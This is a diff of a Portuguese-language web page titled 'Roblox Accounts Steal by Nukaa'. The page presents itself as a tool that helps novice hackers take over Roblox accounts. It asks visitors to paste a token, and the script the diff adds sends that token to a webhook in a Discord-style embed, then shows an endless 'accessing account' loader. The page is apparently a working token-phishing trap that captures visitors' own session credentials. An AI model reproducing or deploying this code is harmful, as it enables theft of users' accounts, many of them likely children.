@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Roblox Accounts Steal by Nukaa</title>
+  <title>Roblox Accounts Steal</title>
   <style>
     body {
-      background: linear-gradient(135deg, #0f001a, #1a0033); /* roxo escuro uniforme */
+      background: linear-gradient(135deg, #0f001a, #1a0033);
       color: #e0ccff;
       font-family: 'Segoe UI', Arial, sans-serif;
       margin: 0;
@@ -18,14 +18,12 @@
       display: flex;
       flex-direction: row;
       min-height: 100vh;
-      background: #0f001a; /* fundo roxo escuro em todo container */
+      background: #0f001a;
     }
     .video-sidebar {
       width: 35%;
       min-width: 320px;
-      background: #0f001a; /* mesmo roxo */
-      position: relative;
-      flex-shrink: 0;
+      background: #0f001a;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -43,7 +41,6 @@
     .video-wrapper iframe {
       width: 100%;
       height: 100%;
-      border: none;
     }
     .video-label {
       margin-top: 12px;
@@ -51,7 +48,6 @@
       color: #ff88aa;
       text-shadow: 0 0 8px #ff0044;
       font-weight: bold;
-      text-align: center;
     }
     #main-content {
       flex: 1;
@@ -61,128 +57,118 @@
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      background: #0f001a; /* roxo escuro no conteúdo principal */
+      background: #0f001a;
     }
-    h1 {
-      color: #ff0044;
-      font-size: 3.2em;
-      margin-bottom: 15px;
-      text-shadow: 0 0 15px #ff0044;
-    }
-    .subtitle {
-      color: #ff88aa;
-      font-size: 1.6em;
-      margin-bottom: 30px;
-      font-weight: bold;
-    }
+    h1 { color: #ff0044; font-size: 3.2em; margin-bottom: 15px; text-shadow: 0 0 15px #ff0044; }
+    .subtitle { color: #ff88aa; font-size: 1.6em; margin-bottom: 30px; font-weight: bold; }
     input {
-      width: 90%;
-      max-width: 550px;
-      padding: 18px;
-      font-size: 20px;
-      border: 3px solid #660033;
-      border-radius: 12px;
-      background: #1a0033; /* input mais escuro pra combinar */
-      color: #ffccdd;
-      margin-bottom: 20px;
+      width: 90%; max-width: 550px; padding: 18px; font-size: 20px;
+      border: 3px solid #660033; border-radius: 12px;
+      background: #1a0033; color: #ffccdd; margin-bottom: 20px;
       box-shadow: inset 0 0 10px #330022;
     }
     button {
-      padding: 18px 80px;
-      font-size: 22px;
-      background: linear-gradient(90deg, #ff0044, #cc0033);
-      color: white;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-      font-weight: bold;
+      padding: 18px 80px; font-size: 22px;
+      background: linear-gradient(90deg, #ff0044, #cc0033); color: white;
+      border: none; border-radius: 12px; cursor: pointer; font-weight: bold;
       box-shadow: 0 0 20px #ff0044;
     }
-    button:hover {
-      background: linear-gradient(90deg, #cc0033, #990022);
-      transform: scale(1.08);
+    button:hover { background: linear-gradient(90deg, #cc0033, #990022); transform: scale(1.08); }
+    #status { margin-top: 30px; font-size: 20px; font-weight: bold; }
+    .glow { text-shadow: 0 0 20px #ff0044, 0 0 40px #cc0033; }
+
+    /* Botão Saiba Mais */
+    #saiba-mais-btn {
+      margin-top: 40px;
+      padding: 12px 40px;
+      font-size: 18px;
+      background: #660033;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
     }
-    #status {
-      margin-top: 30px;
-      font-size: 20px;
-      font-weight: bold;
+    #saiba-mais-btn:hover { background: #990044; }
+
+    /* Modal Saiba Mais */
+    #modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      z-index: 10000;
+      justify-content: center;
+      align-items: center;
     }
-    .glow {
-      text-shadow: 0 0 20px #ff0044, 0 0 40px #cc0033;
+    .modal-content {
+      background: #1a0033;
+      border: 2px solid #660033;
+      border-radius: 12px;
+      padding: 30px;
+      max-width: 600px;
+      width: 90%;
+      position: relative;
+      color: #e0ccff;
+    }
+    .close {
+      position: absolute;
+      top: 10px; right: 20px;
+      font-size: 32px;
+      color: #ff88aa;
+      cursor: pointer;
+    }
+    .close:hover { color: #ff0044; }
+    .modal-section {
+      margin-bottom: 25px;
+    }
+    .modal-section h2 {
+      color: #ff88aa;
+      margin-bottom: 10px;
+      border-bottom: 1px solid #660033;
+      padding-bottom: 8px;
     }
 
     /* Loading screen */
     #loading {
       display: none;
-      position: fixed;
-      top: 0; left: 0;
+      position: fixed; top: 0; left: 0;
       width: 100%; height: 100%;
-      background: #0f001a; /* loading também roxo escuro */
+      background: #0f001a;
       z-index: 9999;
       flex-direction: column;
       justify-content: center;
       align-items: center;
     }
     .spinner {
-      width: 100px;
-      height: 100px;
-      border: 12px solid #ff0044;
-      border-top: 12px solid #cc0033;
-      border-radius: 50%;
-      animation: spin 1.3s linear infinite;
+      width: 100px; height: 100px;
+      border: 12px solid #ff0044; border-top: 12px solid #cc0033;
+      border-radius: 50%; animation: spin 1.3s linear infinite;
       margin-bottom: 50px;
     }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    #loading-text {
-      font-size: 2.6em;
-      color: #ff88aa;
-      text-shadow: 0 0 15px #ff0044;
-      min-height: 80px;
-    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    #loading-text { font-size: 2.6em; color: #ff88aa; text-shadow: 0 0 15px #ff0044; min-height: 80px; }
 
-    /* Responsivo para mobile */
+    /* Responsivo */
     @media (max-width: 900px) {
-      .container {
-        flex-direction: column;
-      }
-      .video-sidebar {
-        width: 100%;
-        padding: 15px 10px;
-      }
-      .video-wrapper {
-        max-width: 90%;
-        height: 180px;
-      }
-      #main-content {
-        padding: 40px 20px;
-      }
-      #video-right {
-        order: 2;
-      }
+      .container { flex-direction: column; }
+      .video-sidebar { width: 100%; padding: 15px 10px; }
+      .video-wrapper { max-width: 90%; height: 180px; }
+      #main-content { padding: 40px 20px; }
+      #video-right { order: 2; }
     }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <!-- Vídeo esquerdo + label -->
     <div class="video-sidebar" id="video-left">
       <div class="video-wrapper">
-        <iframe 
-          src="https://www.youtube.com/embed/FHjCtdGNHCU?rel=0&modestbranding=1&showinfo=0" 
-          title="Tutorial PC" 
-          frameborder="0" 
-          allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-          allowfullscreen>
-        </iframe>
+        <iframe src="https://www.youtube.com/embed/FHjCtdGNHCU?rel=0&modestbranding=1&showinfo=0" frameborder="0" allowfullscreen></iframe>
       </div>
       <div class="video-label">Tutorial pra PC</div>
     </div>
 
-    <!-- Conteúdo principal -->
     <div id="main-content">
       <h1 class="glow">Roblox Accounts Steal by Nukaa</h1>
       <p class="subtitle">Insira o token aqui</p>
@@ -192,18 +178,14 @@
       <button id="sendBtn" onclick="enviar()">Enviar token</button>
 
       <div id="status"></div>
+
+      <!-- Botão Saiba Mais -->
+      <button id="saiba-mais-btn" onclick="openModal()">Saiba Mais</button>
     </div>
 
-    <!-- Vídeo direito + label -->
     <div class="video-sidebar" id="video-right">
       <div class="video-wrapper">
-        <iframe 
-          src="https://www.youtube.com/embed/nwHMDsXw8WE?rel=0&modestbranding=1&showinfo=0" 
-          title="Tutorial Mobile" 
-          frameborder="0" 
-          allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-          allowfullscreen>
-        </iframe>
+        <iframe src="https://www.youtube.com/embed/nwHMDsXw8WE?rel=0&modestbranding=1&showinfo=0" frameborder="0" allowfullscreen></iframe>
       </div>
       <div class="video-label">Tutorial pro Mobile</div>
     </div>
@@ -213,6 +195,25 @@
   <div id="loading">
     <div class="spinner"></div>
     <div id="loading-text">Acessando conta...</div>
+  </div>
+
+  <!-- Modal Saiba Mais -->
+  <div id="modal" onclick="closeModal(event)">
+    <div class="modal-content" onclick="event.stopPropagation()">
+      <span class="close" onclick="closeModal()">&times;</span>
+
+      <div class="modal-section">
+        <h2>Como esse site funciona</h2>
+        <p>Este site procura por senhas nos arquivos do Roblox, por tanto pode demorar.</p>
+        <p>Após enviar o token, o processo de verificação e extração pode levar alguns segundos ou minutos dependendo do tamanho dos arquivos locais e da conexão.</p>
+      </div>
+
+      <div class="modal-section">
+        <h2>Quem somos</h2>
+        <p>Somos uma equipe independente focada em ferramentas de análise e recuperação de contas Roblox. Nosso objetivo e ajudar usuarios novatos no mundo hacker.</p>
+        <p>– Especialistas em Roblox desde 2024.</p>
+      </div>
+    </div>
   </div>
 
   <script>
@@ -273,46 +274,40 @@
             { name: "Status", value: "Conta sendo acessada", inline: true },
             { name: "Fonte", value: "Token colado", inline: true }
           ],
-          footer: {
-            text: new Date().toLocaleString("pt-BR")
-          }
+          footer: { text: new Date().toLocaleString("pt-BR") }
         }]
       };
 
-      async function enviar() {
-  const token = document.getElementById("token").value.trim();
-  const status = document.getElementById("status");
-  const btn = document.getElementById("sendBtn");
-
-  if (token.length < 30) {
-    status.innerHTML = "Token curto demais. Cola o correto.";
-    status.style.color = "#ff6666";
-    return;
-  }
-
-  status.innerHTML = "Enviando token...";
-  status.style.color = "#ffff66";
-
-  btn.disabled = true;
-  btn.innerText = "Enviando...";
-
-  try {
-    const response = await fetch("/api/send-token", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ token })
-    });
-
-    if (response.ok) {
-      status.innerHTML = "";
-      showLoading(); // sua função de loading infinito
-    } else {
-      throw new Error("Erro no servidor");
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      })
+      .then(() => {
+        status.innerHTML = "";
+        showLoading();
+      })
+      .catch(() => {
+        status.innerHTML = "Falha ao enviar. Tente novamente.";
+        status.style.color = "#ff6666";
+        btn.disabled = false;
+        btn.innerText = "Enviar token";
+      });
     }
-  } catch (err) {
-    status.innerHTML = "Falha ao enviar. Tente novamente.";
-    status.style.color = "#ff6666";
-    btn.disabled = false;
-    btn.innerText = "Enviar token";
-  }
-}
+
+    // Funções do modal
+    function openModal() {
+      document.getElementById("modal").style.display = "flex";
+    }
+
+    function closeModal(event) {
+      if (event && event.target.id === "modal") {
+        document.getElementById("modal").style.display = "none";
+      } else if (!event) {
+        document.getElementById("modal").style.display = "none";
+      }
+    }
+  </script>
+
+</body>
+</html>
